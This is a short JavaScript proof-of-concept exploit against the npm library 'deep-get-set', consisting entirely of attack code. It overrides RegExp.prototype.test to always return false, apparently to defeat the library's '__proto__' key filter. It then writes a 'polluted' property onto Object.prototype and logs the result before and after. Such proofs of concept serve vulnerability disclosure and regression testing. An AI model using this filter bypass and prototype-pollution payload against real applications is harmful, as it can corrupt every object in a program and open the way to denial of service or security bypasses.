RegExp.prototype.test = () => false;
const deep = require('deep-get-set');
console.log({}.polluted);
deep({}, [
    '__proto__',
    'polluted'
], 'yes');
console.log({}.polluted);